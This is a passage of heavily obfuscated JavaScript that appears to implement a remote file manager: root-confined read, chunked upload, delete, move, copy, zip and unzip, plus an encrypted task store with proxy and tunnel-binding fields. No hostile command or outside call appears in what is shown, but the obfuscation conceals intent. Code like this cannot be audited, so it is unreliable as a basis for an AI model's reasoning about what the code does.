            }, c = a0o[gz(0x5a0)](a0aE[gz(0xc7c)], a);
        if (!a0aR(c))
            throw new Error(b[gz(0x487)]);
        const d = a0l['statSync'](c);
        if (b[gz(0xcc7)](d[gz(0x885)], 0x400 * 0x400))
            throw new Error(b['EriZR']);
        const f = a0l[gz(0x976)](c), g = this[gz(0xe4d)](f);
        return {
            'status': 'ok',
            'path': a0o[gz(0x9b2)](a0aE[gz(0xc7c)], c),
            'content': g ? a0w[gz(0x376)](f) : f[gz(0x43a)]('utf8'),
            'encoding': g ? b[gz(0xacc)] : b[gz(0xe9a)],
            'is_binary': g,
            'size': d['size']
        };
    }
    static [a0d9(0xe4d)](a) {
        const gA = a0d9, b = {
                'vuxJw': function (c, d) {
                    return c < d;
                }
            };
        if (!a || a[gA(0xc54)] === 0x0)
            return ![];
        for (let c = 0x0; b[gA(0x509)](c, Math[gA(0x100f)](a[gA(0xc54)], 0x200)); c++) {
            if (a[c] === 0x0)
                return !![];
        }
        return ![];
    }
    static async [a0d9(0xb86)](a, b, c, d = null, f = null) {
        const gB = a0d9, g = {
                'aTfNj': gB(0xa7a),
                'FygqY': function (l, m) {
                    return l > m;
                },
                'ZkLor': gB(0xe8f),
                'Pjlkn': function (l, m) {
                    return l !== m;
                },
                'jbqrB': function (l, m) {
                    return l(m);
                },
                'ykHHU': '.upload_chunks'
            }, h = a0o[gB(0x5a0)](a0aE[gB(0xc7c)], a);
        let j = h;
        b && (j = a0o[gB(0xd9d)](h, b));
        if (!a0aR(j))
            throw new Error(g[gB(0xbbb)]);
        !a0l[gB(0x8de)](a0o[gB(0x7e4)](j)) && a0l[gB(0x41b)](a0o[gB(0x7e4)](j), { 'recursive': !![] });
        const k = a0w[gB(0xf7d)](c);
        if (g[gB(0x8e3)](k[gB(0xc54)], a0aE[gB(0x103e)]))
            throw new Error(g[gB(0x671)]);
        if (d !== null && g[gB(0xcb4)](f, null)) {
            const l = Number(d), m = g[gB(0x7b0)](Number, f);
            if (Number[gB(0x878)](l) || Number[gB(0x878)](m))
                throw new Error('chunk_id\x20and\x20total_chunks\x20must\x20be\x20numeric');
            const n = a0o[gB(0xd9d)](a0o[gB(0x7e4)](j), g[gB(0x811)], a0o[gB(0xe49)](j));
            !a0l['existsSync'](n) && a0l[gB(0x41b)](n, { 'recursive': !![] });
            const o = a0o[gB(0xd9d)](n, gB(0x576)['concat'](l));
            a0l[gB(0x571)](o, k);
            const p = a0l['readdirSync'](n)['filter'](s => s[gB(0x1ba)]('chunk_')), q = p['length'], r = q === m;
            if (r) {
                const s = [];
                for (let u = 0x0; u < m; u++) {
                    const v = a0o[gB(0xd9d)](n, gB(0x576)['concat'](u));
                    if (!a0l[gB(0x8de)](v))
                        throw new Error(gB(0xb7e)['concat'](u));
                    s[gB(0xb66)](a0l[gB(0x976)](v));
                }
                a0l[gB(0x571)](j, Buffer[gB(0x83f)](s));
                const t = a0o[gB(0x7e4)](n);
                a0l[gB(0xeeb)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[gB(0xbcb)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[gB(0x9b2)](a0aE[gB(0xc7c)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[gB(0x571)](j, k), {
            'status': 'ok',
            'path': a0o[gB(0x9b2)](a0aE[gB(0xc7c)], j),
            'received': k[gB(0xc54)],
            'total': k[gB(0xc54)],
            'chunked': ![]
        };
    }
    static async ['uploadFileRaw'](a, b, c, d = null, f = null) {
        const gC = a0d9, g = {
                'XWuUy': function (k, l) {
                    return k || l;
                },
                'PRFsk': 'Access\x20denied:\x20path\x20outside\x20root',
                'IUqai': function (k, l) {
                    return k > l;
                },
                'ENTMF': gC(0xe8f),
                'CQbLs': function (k, l) {
                    return k !== l;
                },
                'UkfQJ': function (k, l) {
                    return k !== l;
                },
                'oWbhv': function (k, l) {
                    return k(l);
                },
                'vQgUe': gC(0x30d),
                'AsbXN': gC(0xaca),
                'MNLEE': function (k, l) {
                    return k < l;
                },
                'EoGCo': 'All\x20chunks\x20received.\x20File\x20merged\x20successfully.'
            }, h = a0o[gC(0x5a0)](a0aE[gC(0xc7c)], g[gC(0x51a)](a, '.'));
        let j = h;
        b && (j = a0o[gC(0xd9d)](h, b));
        if (!a0aR(j))
            throw new Error(g[gC(0x59d)]);
        !a0l[gC(0x8de)](a0o[gC(0x7e4)](j)) && a0l['mkdirSync'](a0o['dirname'](j), { 'recursive': !![] });
        if (g[gC(0x19a)](c[gC(0xc54)], a0aE['MAX_UPLOAD_SIZE']))
            throw new Error(g['ENTMF']);
        if (g[gC(0x14e)](d, null) && g['UkfQJ'](f, null)) {
            const k = g[gC(0x789)](Number, d), l = g[gC(0x789)](Number, f);
            if (Number[gC(0x878)](k) || Number[gC(0x878)](l))
                throw new Error(g['vQgUe']);
            const m = a0o['join'](a0o[gC(0x7e4)](j), g[gC(0x828)], a0o[gC(0xe49)](j));
            !a0l[gC(0x8de)](m) && a0l[gC(0x41b)](m, { 'recursive': !![] });
            const n = a0o['join'](m, gC(0x576)['concat'](k));
            a0l[gC(0x571)](n, c);
            const o = a0l['readdirSync'](m)[gC(0x595)](r => r['startsWith'](gC(0x576))), p = o[gC(0xc54)], q = p === l;
            if (q) {
                const r = [];
                for (let t = 0x0; g[gC(0x391)](t, l); t++) {
                    const u = a0o[gC(0xd9d)](m, gC(0x576)[gC(0x83f)](t));
                    if (!a0l['existsSync'](u))
                        throw new Error(gC(0xb7e)[gC(0x83f)](t));
                    r[gC(0xb66)](a0l['readFileSync'](u));
                }
                a0l[gC(0x571)](j, Buffer[gC(0x83f)](r));
                const s = a0o[gC(0x7e4)](m);
                a0l[gC(0xeeb)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[gC(0xbcb)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o[gC(0x9b2)](a0aE[gC(0xc7c)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g['EoGCo']
                };
            }
            return {
                'status': 'ok',
                'path': a0o[gC(0x9b2)](a0aE[gC(0xc7c)], j),
                'chunk_id': k,
                'completed': ![],
                'message': gC(0x37c)[gC(0x83f)](k, gC(0xad4))
            };
        }
        return a0l[gC(0x571)](j, c), {
            'status': 'ok',
            'path': a0o[gC(0x9b2)](a0aE[gC(0xc7c)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': gC(0xf44)
        };
    }
    static async [a0d9(0x539)](a) {
        const gD = a0d9, b = {
                'RPbKQ': gD(0xa7a),
                'epLXC': gD(0x999)
            }, c = a0o[gD(0x5a0)](a0aE[gD(0xc7c)], a);
        if (!a0aR(c))
            throw new Error(b['RPbKQ']);
        if (!a0l[gD(0x8de)](c))
            throw new Error(b['epLXC']);
        const d = a0l[gD(0x91f)](c), f = await a0l[gD(0x798)]['readFile'](c);
        return {
            'path': a0o['relative'](a0aE[gD(0xc7c)], c),
            'content': f,
            'size': d[gD(0x885)]
        };
    }
    static async [a0d9(0x998)](a) {
        const gE = a0d9, b = {
                'CATvf': gE(0xf3e),
                'YMEer': 'deleted'
            }, c = [];
        for (const d of a) {
            const f = a0o[gE(0x5a0)](a0aE[gE(0xc7c)], d);
            if (!a0aR(f)) {
                c[gE(0xb66)]({
                    'path': d,
                    'status': b[gE(0xe5e)]
                });
                continue;
            }
            try {
                if (a0l[gE(0x8de)](f)) {
                    const g = a0l[gE(0x91f)](f);
                    g['isDirectory']() ? a0l[gE(0xeeb)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l[gE(0xbbc)](f), c['push']({
                        'path': d,
                        'status': b[gE(0xa80)]
                    });
                } else
                    c[gE(0xb66)]({
                        'path': d,
                        'status': gE(0x26d)
                    });
            } catch (h) {
                c[gE(0xb66)]({
                    'path': d,
                    'status': 'error',
                    'message': h[gE(0x769)]
                });
            }
        }
        return c;
    }
    static async [a0d9(0x145)](a) {
        const gF = a0d9, b = {
                'uUlZy': function (d, f) {
                    return d(f);
                },
                'KiUwc': 'denied',
                'aqcfD': gF(0x791),
                'pErKQ': function (d, f) {
                    return d === f;
                },
                'UgeLc': gF(0x327),
                'nbkIk': gF(0xe28),
                'TjIEF': 'destination\x20parent\x20is\x20not\x20a\x20directory',
                'ldUfx': gF(0x95f)
            }, c = [];
        for (const [d, f] of Object[gF(0x77e)](a || {})) {
            const g = a0o['resolve'](a0aE[gF(0xc7c)], d), h = a0o[gF(0x5a0)](a0aE['FILE_ROOT'], f);
            if (!b[gF(0xd81)](a0aR, g) || !b[gF(0xd81)](a0aR, h)) {
                c[gF(0xb66)]({
                    'from': d,
                    'to': f,
                    'status': b[gF(0xe9f)],
                    'error': b[gF(0x9a3)],
                    'message': b[gF(0x9a3)]
                });
                continue;
            }
            try {
                a0l[gF(0xc59)](g);
            } catch (i) {
                const j = b[gF(0x2df)](i[gF(0x503)], b['UgeLc']) ? b[gF(0x7e5)] : i['message'];
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b['pErKQ'](i[gF(0x503)], b[gF(0xe19)]) ? 'skipped' : gF(0x95f),
                    'error': j,
                    'message': j
                });
                continue;
            }
            try {
                const k = a0o[gF(0x7e4)](h);
                !a0l[gF(0x8de)](k) && a0l[gF(0x41b)](k, { 'recursive': !![] });
                if (!a0l['statSync'](k)[gF(0x6f4)]()) {
                    const l = b['TjIEF'];
                    c[gF(0xb66)]({
                        'from': d,
                        'to': f,
                        'status': b[gF(0xe9f)],
                        'error': l,
                        'message': l
                    });
                    continue;
                }
                a0l['renameSync'](g, h), c[gF(0xb66)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (m) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[gF(0xe6f)],
                    'error': m['message'],
                    'message': m[gF(0x769)]
                });
            }
        }
        return c;
    }
    static async [a0d9(0x992)](a) {
        const gG = a0d9, b = {
                'IkRpm': function (d, f, g) {
                    return d(f, g);
                },
                'Tzvsu': function (d, f) {
                    return d(f);
                },
                'nGaOO': function (d, f) {
                    return d(f);
                },
                'CMFfY': gG(0x4ed),
                'cwddY': 'path\x20outside\x20file\x20root',
                'ImfsE': function (d, f) {
                    return d === f;
                },
                'SeATn': gG(0x327),
                'FQsRn': gG(0xe28),
                'VNUBH': function (d, f) {
                    return d === f;
                },
                'aXIwY': 'skipped',
                'PqPhN': gG(0x95f),
                'AwaZW': gG(0x606),
                'fMKXL': function (d, f) {
                    return d !== f;
                },
                'BBgCa': function (d, f, g) {
                    return d(f, g);
                }
            }, c = [];
        for (const [d, f] of Object[gG(0x77e)](a || {})) {
            const g = a0o[gG(0x5a0)](a0aE[gG(0xc7c)], d), h = a0o[gG(0x5a0)](a0aE[gG(0xc7c)], f);
            if (!b['Tzvsu'](a0aR, g) || !b['nGaOO'](a0aR, h)) {
                c[gG(0xb66)]({
                    'from': d,
                    'to': f,
                    'status': b[gG(0xd67)],
                    'error': b[gG(0x4bb)],
                    'message': b['cwddY']
                });
                continue;
            }
            try {
                a0l[gG(0xc59)](g);
            } catch (i) {
                const j = b[gG(0x34e)](i[gG(0x503)], b[gG(0xb05)]) ? b[gG(0x42e)] : i[gG(0x769)];
                c[gG(0xb66)]({
                    'from': d,
                    'to': f,
                    'status': b[gG(0x70e)](i[gG(0x503)], b[gG(0xb05)]) ? b[gG(0x7ba)] : b[gG(0x962)],
                    'error': j,
                    'message': j
                });
                continue;
            }
            try {
                const k = a0o['dirname'](h);
                !a0l[gG(0x8de)](k) && a0l[gG(0x41b)](k, { 'recursive': !![] });
                if (!a0l[gG(0x91f)](k)[gG(0x6f4)]()) {
                    const m = b[gG(0x5f3)];
                    c[gG(0xb66)]({
                        'from': d,
                        'to': f,
                        'status': b[gG(0xd67)],
                        'error': m,
                        'message': m
                    });
                    continue;
                }
                const l = a0l[gG(0x91f)](g);
                if (l[gG(0x6f4)]()) {
                    const n = a0o[gG(0x9b2)](g, h);
                    if (b['VNUBH'](n, '') || b[gG(0x422)](n, '..') && !n[gG(0x1ba)]('..'[gG(0x83f)](a0o[gG(0x69b)])) && !a0o[gG(0xd76)](n))
                        throw new Error('destination\x20is\x20inside\x20source\x20directory');
                    if (a0l[gG(0xcb3)])
                        a0l[gG(0xcb3)](g, h, { 'recursive': !![] });
                    else {
                        const o = (p, q) => {
                            const gH = gG, r = a0l['lstatSync'](p);
                            if (r['isSymbolicLink']())
                                a0l[gH(0x22a)](a0l[gH(0xddb)](p), q);
                            else {
                                if (r[gH(0x6f4)]()) {
                                    if (!a0l[gH(0x8de)](q))
                                        a0l[gH(0x41b)](q, { 'recursive': !![] });
                                    for (const s of a0l[gH(0xdb7)](p)) {
                                        b[gH(0xf38)](o, a0o[gH(0xd9d)](p, s), a0o[gH(0xd9d)](q, s));
                                    }
                                } else
                                    a0l[gH(0x77a)](p, q);
                            }
                        };
                        b[gG(0xb6c)](o, g, h);
                    }
                } else
                    a0l[gG(0x77a)](g, h);
                c[gG(0xb66)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (p) {
                c[gG(0xb66)]({
                    'from': d,
                    'to': f,
                    'status': b[gG(0x962)],
                    'error': p['message'],
                    'message': p[gG(0x769)]
                });
            }
        }
        return c;
    }
    static async ['createDirectory'](a) {
        const gI = a0d9, b = {
                'PjSXe': function (d, f) {
                    return d(f);
                }
            }, c = a0o[gI(0x5a0)](a0aE[gI(0xc7c)], a);
        if (!b[gI(0x86f)](a0aR, c))
            throw new Error(gI(0xa7a));
        return a0l[gI(0x41b)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[gI(0x9b2)](a0aE[gI(0xc7c)], c)
        };
    }
    static [a0d9(0x49e)](a) {
        const gJ = a0d9;
        return a0o[gJ(0x9b2)](a0aE[gJ(0xc7c)], a) || '.';
    }
    static async ['zipItems'](a, b, c = ![]) {
        const gK = a0d9, d = {
                'NAeXF': function (s, t) {
                    return s(t);
                },
                'HoEJa': gK(0x791),
                'FxBFS': function (s, t, u) {
                    return s(t, u);
                },
                'HwqYe': function (s, t) {
                    return s === t;
                },
                'JSlZU': function (s, t) {
                    return s(t);
                },
                'fcjaw': gK(0xa7a),
                'pxTix': 'ENOENT',
                'QxQSZ': gK(0x41d),
                'uavwi': function (s, t, u) {
                    return s(t, u);
                },
                'cTYhg': function (s, t, u) {
                    return s(t, u);
                },
                'frZuW': function (s, t, u) {
                    return s(t, u);
                },
                'mccLP': gK(0x8d0),
                'bQcfB': gK(0xf3c),
                'SlYcN': function (s) {
                    return s();
                },
                'eFuuv': function (s, t) {
                    return s > t;
                },
                'RBaFQ': gK(0xfcc),
                'zKXuE': function (s, t) {
                    return s > t;
                }
            };
        if (!a)
            throw new a0aU(gK(0xc24), 0x190);
        if (!Array[gK(0xedd)](b) || d['HwqYe'](b[gK(0xc54)], 0x0))
            throw new a0aU(gK(0xf4b), 0x190);
        const f = a0o[gK(0x5a0)](a0aE['FILE_ROOT'], a);
        if (!d[gK(0x1053)](a0aR, f))
            throw new a0aU(d[gK(0x760)], 0x193);
        let g;
        try {
            g = a0l[gK(0x91f)](f);
        } catch (s) {
            if (s[gK(0x503)] !== d['pxTix'])
                throw s;
        }
        if (g && g[gK(0x6f4)]())
            throw new a0aU(gK(0xc1d)[gK(0x83f)](a), 0x190);
        a0l[gK(0x41b)](a0o[gK(0x7e4)](f), { 'recursive': !![] });
        if (g)
            a0l[gK(0xbbc)](f);
        const h = a0aS[gK(0xdb5)](f), i = [];
        let j = 0x0, k = 0x0, l = ![], m = ![];
        const n = () => {
                const gL = gK;
                if (m)
                    return;
                m = !![], h[gL(0x76b)]();
            }, o = (t, u, v = 0x0) => {
                const gM = gK;
                k++, i[gM(0xb66)]({
                    'item': t,
                    'status': 'error',
                    'error': u['message'] || d[gM(0xd98)](String, u),
                    'added': v
                });
            };
        try {
            for (const t of b) {
                if (l) {
                    i['push']({
                        'item': t,
                        'status': d[gK(0x758)],
                        'added': 0x0
                    });
                    continue;
                }
                const u = a0o[gK(0x5a0)](a0aE[gK(0xc7c)], t || '');
                if (!a0aR(u)) {
                    d[gK(0x23e)](o, t, new Error(d[gK(0xbf5)]));
                    continue;
                }
                let v;
                try {
                    v = a0l['statSync'](u);
                } catch (z) {
                    if (d['HwqYe'](z[gK(0x503)], d[gK(0x9aa)]))
                        i[gK(0xb66)]({
                            'item': t,
                            'status': 'not_found',
                            'added': 0x0
                        });
                    else
                        d[gK(0x40d)](o, t, z);
                    continue;
                }
                let w = 0x0, x = ![], y = null;
                if (v[gK(0xaf5)]()) {
                    let A;
                    try {
                        A = a0l[gK(0x976)](u);
                    } catch (B) {
                        d[gK(0x9ab)](o, t, B);
                        continue;
                    }
                    if (!h[gK(0xbcd)](a0o['basename'](u), A, v[gK(0x1a5)])) {
                        l = !![], i[gK(0xb66)]({
                            'item': t,
                            'status': d[gK(0x758)],
                            'added': 0x0
                        });
                        continue;
                    }
                    w = 0x1;
                } else {
                    if (v[gK(0x6f4)]()) {
                        const C = a0o[gK(0xe49)](u), D = (E, F) => {
                                const gN = gK;
                                let G;
                                try {
                                    G = a0l[gN(0xdb7)](E);
                                } catch (H) {
                                    y = y || H;
                                    return;
                                }
                                for (const I of G) {
                                    if (x)
                                        return;
                                    const J = a0o[gN(0xd9d)](E, I), K = F ? ''['concat'](F, '/')['concat'](I) : I;
                                    let L;
                                    try {
                                        L = a0l[gN(0xc59)](J);
                                    } catch (M) {
                                        y = y || M;
                                        continue;
                                    }
                                    if (L['isSymbolicLink']()) {
                                        y = y || new Error(gN(0xcbc)[gN(0x83f)](K));
                                        continue;
                                    }
                                    if (!a0aR(J)) {
                                        y = y || new Error(d['HoEJa']);
                                        continue;
                                    }
                                    if (L[gN(0x6f4)]()) {
                                        if (!h['add'](''[gN(0x83f)](K, '/'), Buffer[gN(0x901)](0x0), L[gN(0x1a5)], !![])) {
                                            x = !![];
                                            return;
                                        }
                                        d[gN(0x23e)](D, J, K);
                                    } else {
                                        if (L[gN(0xaf5)]()) {
                                            let N;
                                            try {
                                                N = a0l[gN(0x976)](J);
                                            } catch (O) {
                                                y = y || O;
                                                continue;
                                            }
                                            if (!h[gN(0xbcd)](K, N, L[gN(0x1a5)])) {
                                                x = !![];
                                                return;
                                            }
                                            w++;
                                        } else
                                            y = y || new Error(gN(0xcb0)['concat'](K));
                                    }
                                }
                            };
                        D(u, c ? '' : C);
                    } else {
                        d[gK(0xf99)](o, t, new Error(d[gK(0x757)]));
                        continue;
                    }
                }
                if (y)
                    o(t, y, w);
                else
                    x ? (l = !![], i[gK(0xb66)]({
                        'item': t,
                        'status': d['bQcfB'],
                        'added': w
                    })) : i[gK(0xb66)]({
                        'item': t,
                        'status': 'ok',
                        'added': w
                    });
                j += w;
            }
            d[gK(0x6cd)](n);
        } finally {
            if (!m)
                try {
                    n();
                } catch (E) {
                }
        }
        const p = i[gK(0x595)](F => F['status'] === 'ok' || F[gK(0x13d)] === gK(0xf3c))[gK(0xc54)];
        let q = 'ok';
        if (d[gK(0xf88)](k, 0x0))
            q = d['eFuuv'](p, 0x0) ? d['bQcfB'] : d['RBaFQ'];
        const r = {
            'status': q,
            'path': a0aV[gK(0x49e)](f),
            'entries': j,
            'size': a0l['statSync'](f)['size'],
            'results': i
        };
        if (d[gK(0x9e5)](k, 0x0))
            r[gK(0x769)] = ''[gK(0x83f)](k, gK(0x617))['concat'](b[gK(0xc54)], gK(0x36a));
        return r;
    }
    static async [a0d9(0xd93)](a, b, c = !![], d = null) {
        const gO = a0d9, f = {
                'vaEze': gO(0xc24),
                'Jtwlh': function (q, r) {
                    return q(r);
                },
                'IIIFh': gO(0xa7a),
                'mbpRc': function (q, r) {
                    return q === r;
                },
                'KmFdX': gO(0x327),
                'rmMhK': function (q, r) {
                    return q !== r;
                },
                'JJGpM': function (q, r) {
                    return q >= r;
                },
                'lrLSv': function (q, r) {
                    return q > r;
                },
                'ZXbhD': function (q, r) {
                    return q + r;
                },
                'OBgko': function (q, r) {
                    return q(r);
                },
                'xhJXl': function (q, r) {
                    return q !== r;
                },
                'PlTbx': function (q, r) {
                    return q > r;
                },
                'FkJEG': function (q, r) {
                    return q + r;
                },
                'sjaDs': function (q, r) {
                    return q < r;
                }
            };
        if (!a)
            throw new a0aU(f[gO(0x1076)], 0x190);
        const g = a0o[gO(0x5a0)](a0aE[gO(0xc7c)], a);
        if (!f[gO(0xb4a)](a0aR, g))
            throw new a0aU(f[gO(0x1b8)], 0x193);
        let h;
        try {
            h = a0l[gO(0x91f)](g);
        } catch (q) {
            if (f[gO(0x38d)](q['code'], f[gO(0xa4b)]))
                throw new a0aU(gO(0x9a6)['concat'](a), 0x190, q);
            throw q;
        }
        if (h[gO(0x6f4)]())
            throw new a0aU(gO(0x3a5)[gO(0x83f)](a), 0x190);
        let i;
        if (b) {
            i = a0o['resolve'](a0aE[gO(0xc7c)], b);
            if (!a0aR(i))
                throw new a0aU(gO(0xa7a), 0x193);
            let r;
            try {
                r = a0l['statSync'](i);
            } catch (s) {
                if (f[gO(0x1dd)](s['code'], f['KmFdX']))
                    throw s;
            }
            if (r && !r[gO(0x6f4)]())
                throw new a0aU(gO(0x3db)[gO(0x83f)](b), 0x190);
        } else
            i = a0o[gO(0x7e4)](g);
        a0l[gO(0x41b)](i, { 'recursive': !![] });
        let j;
        try {
            j = a0aS[gO(0xadd)](g);
        } catch (t) {
            if (t[gO(0x503)])
                throw t;
            throw new a0aU(gO(0x4d3)[gO(0x83f)](a), 0x190, t);
        }
        const k = (d || [])['filter'](u => u);
        let l = 0x0, m = 0x0, n = 0x0;
        const o = [];
        let p = ![];
        for (const u of j) {
            if (u[gO(0xd19)])
                continue;
            if (f[gO(0x555)](l + m, a0aS[gO(0xac0)]) || n >= a0aS[gO(0x1e1)]) {
                m++;
                continue;
            }
            const v = u['name'][gO(0x8d4)](/\\/g, '/');
            if (k['length']) {
                const B = v['split']('/')[gO(0xbfa)]();
                if (!k[gO(0x152)](v) && !k[gO(0x152)](B)) {
                    m++;
                    continue;
                }
            }
            if (u[gO(0x4bd)] || u[gO(0x453)] || f['lrLSv'](f[gO(0xacd)](n, u[gO(0x885)]), a0aS['ZIP_MAX_TOTAL_BYTES'])) {
                m++;
                continue;
            }
            const w = a0o[gO(0x5a0)](i, v), x = a0o[gO(0x9b2)](i, w);
            if (x[gO(0x1ba)]('..') || a0o[gO(0xd76)](x)) {
                m++;
                continue;
            }
            if (!f[gO(0x9e9)](a0aR, w)) {
                m++;
                continue;
            }
            let y;
            try {
                y = a0aS[gO(0xa11)](u);
            } catch (C) {
                throw new a0aU(gO(0x950)[gO(0x83f)](u[gO(0x94b)], gO(0x61b))['concat'](C[gO(0x769)]), 0x1f4, C);
            }
            if (f[gO(0xdbf)](y[gO(0xc54)], u['size']) || f[gO(0x41e)](f[gO(0x582)](n, y[gO(0xc54)]), a0aS['ZIP_MAX_TOTAL_BYTES']) || a0aS[gO(0xa8d)](y) !== u[gO(0x78a)])
                throw new a0aU('Invalid\x20zip\x20entry\x20\x27'[gO(0x83f)](u[gO(0x94b)], gO(0x9bb)), 0x1f4);
            if (!c && a0l[gO(0x8de)](w)) {
                m++;
                continue;
            }
            a0l[gO(0x41b)](a0o['dirname'](w), { 'recursive': !![] });
            let z, A;
            try {
                z = a0l[gO(0x8cc)](w, 'w');
                try {
                    a0l[gO(0x571)](z, y);
                } catch (D) {
                    A = D;
                }
                try {
                    a0l[gO(0xd7a)](z);
                } catch (E) {
                    A = A || E;
                }
            } finally {
                if (A) {
                    try {
                        a0l[gO(0xbbc)](w);
                    } catch (F) {
                    }
                    throw A;
                }
            }
            l++, n += y[gO(0xc54)], f[gO(0x8f6)](o['length'], a0aS[gO(0x4ba)]) ? o[gO(0xb66)](a0aV['_displayPath'](w)) : p = !![];
        }
        return {
            'status': 'ok',
            'path': a0aV['_displayPath'](g),
            'dest': a0aV[gO(0x49e)](i),
            'extracted': l,
            'skipped': m,
            'files': o,
            'files_truncated': p
        };
    }
}
class a0aW {
    static [a0d9(0x38e)] = a0d9(0x691);
    static [a0d9(0x997)] = 0x1;
    static [a0d9(0xc3e)] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null,
        'hubregs': [],
        'proxyports': {
            'hub': [],
            'local': []
        },
        'argobinds': []
    };
    static ['homeDir']() {
        const gP = a0d9;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l['existsSync'](a))
                return a;
        }
        try {
            return a0p['homedir']() || process[gP(0x1075)]();
        } catch (b) {
            return process['cwd']();
        }
    }
    static [a0d9(0x752)](a) {
        const gQ = a0d9, b = {
                'CPhKI': gQ(0x1a2),
                'AShfa': function (c, d) {
                    return c === d;
                },
                'WJFwT': gQ(0x66e)
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/[gQ(0xf92)](a)) {
                const d = Buffer[gQ(0xca5)](a, b[gQ(0xa73)]);
                return b[gQ(0x19f)](d[gQ(0xc54)], 0x20) ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/[gQ(0xf92)](a))
                return null;
            const c = Buffer[gQ(0xca5)](a, b[gQ(0x294)]);
            return c[gQ(0xc54)] === 0x20 ? c : null;
        } catch (f) {
            return null;
        }
    }
    static [a0d9(0xd4d)]() {
        const gR = a0d9, a = {
                'HqbiQ': gR(0xb42),
                'qmigU': gR(0xc07),
                'PyklF': gR(0x9cd),
                'GNqrk': gR(0x830),
                'zGECn': 'store.enc',
                'frFSj': '[TaskStore]\x20💾\x20KSTORE_KEY\x20未设置,\x20任务持久化未启用'
            }, b = a0aW[gR(0xc3e)];
        let c = (process.env.KSTORE || '')[gR(0x5b0)]();
        if ([
                a['HqbiQ'],
                '0',
                a['qmigU'],
                gR(0x96e)
            ][gR(0x152)](c[gR(0x544)]()))
            return a0R[gR(0x543)](a[gR(0x8f5)]), b;
        const d = (process.env.KSTORE_KEY || '')[gR(0x5b0)]();
        !c && (c = a0o[gR(0xd9d)](a0aW[gR(0x55b)](), a['GNqrk'], a['zGECn']));
        const f = a0aW[gR(0x752)](d);
        if (!f) {
            if (d)
                a0R[gR(0xfcc)](gR(0xade));
            else
                a0R[gR(0x543)](a[gR(0x306)]);
            return b;
        }
        return b[gR(0x4fa)] = c, b[gR(0x525)] = f, b['enabled'] = !![], a0R[gR(0x543)](gR(0xc51)[gR(0x83f)](b['path'])), b;
    }
    static [a0d9(0xfb0)](a, b) {
        const gS = a0d9, c = {
                'gglxa': 'utf8',
                'hzgya': 'base64'
            }, d = a0k[gS(0x7bb)](0xc), f = a0k[gS(0xef4)](gS(0x5a6), a, d), g = Buffer[gS(0x83f)]([
                f[gS(0x19c)](Buffer[gS(0xca5)](b, c[gS(0x981)])),
                f['final']()
            ]), h = {
                'nonce': d[gS(0x43a)](gS(0x66e)),
                'tag': f['getAuthTag']()[gS(0x43a)](c[gS(0x269)]),
                'ciphertext': g[gS(0x43a)](c[gS(0x269)])
            };
        return Buffer[gS(0xca5)](JSON[gS(0x41c)](h), c[gS(0x981)])[gS(0x43a)](c['hzgya']);
    }
    static [a0d9(0xf46)](a, b) {
        const gT = a0d9, c = {
                'BAwuI': gT(0xfdc),
                'dzzWU': gT(0x5a6),
                'YKxXH': gT(0x66e),
                'UAZGR': gT(0xec2)
            }, d = JSON['parse'](Buffer[gT(0xca5)](b, 'base64')[gT(0x43a)](gT(0xec2)));
        if (!d['nonce'] || !d['tag'] || !d['ciphertext'])
            throw new Error(c[gT(0x744)]);
        const f = a0k[gT(0x7be)](c[gT(0x315)], a, Buffer[gT(0xca5)](d[gT(0x398)], c[gT(0xdf0)]));
        return f[gT(0x76e)](Buffer['from'](d[gT(0x900)], gT(0x66e))), Buffer['concat']([
            f['update'](Buffer[gT(0xca5)](d['ciphertext'], c[gT(0xdf0)])),
            f[gT(0xb87)]()
        ])[gT(0x43a)](c['UAZGR']);
    }
    static [a0d9(0xe75)]() {
        const gU = a0d9, a = {
                'qXhYV': function (c, d) {
                    return c === d;
                },
                'KcZjN': gU(0xba0),
                'xZzTf': gU(0xec2),
                'GJPUp': function (c, d) {
                    return c !== d;
                },
                'izONs': gU(0x9fa),
                'wrfLT': function (c, d) {
                    return c !== d;
                },
                'JJkel': function (c, d) {
                    return c(d);
                }
            }, b = a0aW[gU(0xc3e)];
        b['hubregs'] = [], b[gU(0xa6d)] = {
            'hub': [],
            'local': []
        }, b[gU(0xd44)] = [];
        if (!b['enabled'])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l[gU(0x8de)](b[gU(0x4fa)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l[gU(0x976)](b[gU(0x4fa)], a[gU(0xcaa)])[gU(0x5b0)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON[gU(0xadd)](a0aW['decrypt'](b[gU(0x525)], c));
            } catch (l) {
                throw new Error('解密失败\x20(密钥错误或数据被篡改):\x20'[gU(0x83f)](l['message']));
            }
            if (!d || a[gU(0x8e9)](d['magic'], a0aW[gU(0x38e)]))
                throw new Error(a['izONs']);
            const f = parseInt(d[gU(0x227)], 0xa) || 0x0;
            if (f > a0aW['VERSION'])
                return b[gU(0x96f)] = !![], a0R[gU(0xfcc)](gU(0x52c)[gU(0x83f)](f, '\x20高于支持版本\x20')[gU(0x83f)](a0aW[gU(0x997)], gU(0x38a))), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a['wrfLT'](f, a0aW[gU(0x997)]))
                throw new Error('不支持的版本\x20'['concat'](f));
            const g = d[gU(0xe83)] || {};
            b[gU(0xd5e)] = d[gU(0x22c)] || null;
